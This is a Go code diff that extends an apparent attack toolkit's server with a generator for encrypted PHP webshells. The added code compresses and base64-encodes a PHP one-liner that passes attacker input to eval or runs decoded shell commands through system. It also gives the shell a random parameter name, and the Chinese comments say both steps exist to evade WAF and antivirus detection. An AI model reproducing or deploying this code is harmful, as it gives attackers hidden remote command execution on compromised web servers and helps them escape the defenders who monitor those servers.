@@ -21,7 +21,9 @@ package server
 
 import (
 	"bytes"
+	"compress/flate"
 	"context"
+	"crypto/rand"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
@@ -1427,14 +1429,95 @@ func (s *Server) webshellGetPayload(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, webshellErrCode(err), err.Error())
 		return
 	}
+	// 加密型载荷在这里才生成正文与参数名；param 可指定，留空则每次随机。
+	content, dynamicParam, err := webshellRenderDynamicPayload(content, strings.TrimSpace(r.URL.Query().Get("param")))
+	if err != nil {
+		writeErr(w, 400, err.Error())
+		return
+	}
 	writeJSON(w, 200, map[string]any{
 		"name":    entry.Name,
 		"type":    entry.Type,
 		"file":    entry.File,
-		"size":    entry.Size,
+		"size":    len(content),
 		"meta":    entry.Meta,
 		"content": content,
+		"param":   dynamicParam,
 	})
+}
+
+// ---------------------------------------------------------------------------
+// 加密载荷（落地时生成）
+// ---------------------------------------------------------------------------
+//
+// 内置库里带 __ARTEX_L__ 占位的 payload 是「加密马」：磁盘上只有一段 base64 密文，
+// 明文逻辑与参数名都留到取用那一刻才拼进去。理由很实际——明文一句话马的
+// `eval($_POST['pass'])`、`system(...)` 是 WAF/AV 的固定特征，落上去就被查杀；
+// 参数名再固定成 pass / cmd / shell，等于把入口写在文件名旁边。
+//
+// 参数名一律随机字母+数字（首字符字母），与 webshell_mcp.py 的 ENC_* 保持逐字一致：
+// 两边下发的是同一匹马，任何一侧改了 inner 逻辑，另一侧必须同步。
+
+const (
+	webshellEncKeyToken  = "__ARTEX_K__"
+	webshellEncBlobToken = "__ARTEX_L__"
+	// webshellEncInner 是被 gzinflate 的运行时逻辑：既吃 PHP 代码（eval 型协议），
+	// 也吃 base64 命令（免杀降级协议），两个方向都能通。
+	webshellEncInner = `$s=isset($_POST[$K])?$_POST[$K]:(isset($_GET[$K])?$_GET[$K]:'');` +
+		`if($s!==''){if(strpos($s,'$')!==false||strpos($s,';')!==false){@eval($s);}else{@system(base64_decode($s));}}`
+)
+
+// webshellRandomParam 生成 n 位随机参数名（小写字母+数字，首字符为字母）。
+func webshellRandomParam(n int) (string, error) {
+	if n < 6 {
+		n = 6
+	}
+	const letters = "abcdefghijklmnopqrstuvwxyz"
+	const alnum = "abcdefghijklmnopqrstuvwxyz0123456789"
+	buf := make([]byte, n)
+	if _, err := rand.Read(buf); err != nil {
+		return "", err
+	}
+	out := make([]byte, n)
+	out[0] = letters[int(buf[0])%len(letters)]
+	for i := 1; i < n; i++ {
+		out[i] = alnum[int(buf[i])%len(alnum)]
+	}
+	return string(out), nil
+}
+
+// webshellRenderDynamicPayload 把占位载荷渲染成可直接落地的全文，并返回本次参数名。
+// 非加密载荷原样返回（param 为空）。
+func webshellRenderDynamicPayload(text, param string) (string, string, error) {
+	if !strings.Contains(text, webshellEncBlobToken) {
+		return text, "", nil
+	}
+	key := strings.TrimSpace(param)
+	if key == "" {
+		var err error
+		key, err = webshellRandomParam(8)
+		if err != nil {
+			return "", "", fmt.Errorf("生成随机参数名失败: %v", err)
+		}
+	}
+	if !webshellParamRE.MatchString(key) {
+		return "", "", fmt.Errorf("param 非法（字母/数字/下划线，字母或下划线开头）: %s", key)
+	}
+	var buf bytes.Buffer
+	zw, err := flate.NewWriter(&buf, flate.BestCompression)
+	if err != nil {
+		return "", "", fmt.Errorf("压缩载荷失败: %v", err)
+	}
+	if _, err := zw.Write([]byte(webshellEncInner)); err != nil {
+		return "", "", fmt.Errorf("压缩载荷失败: %v", err)
+	}
+	if err := zw.Close(); err != nil {
+		return "", "", fmt.Errorf("压缩载荷失败: %v", err)
+	}
+	blob := base64.StdEncoding.EncodeToString(buf.Bytes())
+	out := strings.ReplaceAll(text, webshellEncBlobToken, blob)
+	out = strings.ReplaceAll(out, webshellEncKeyToken, key)
+	return out, key, nil
 }
 
 func webshellPayloadEntries(typeFilter string) ([]webshellPayloadEntry, error) {
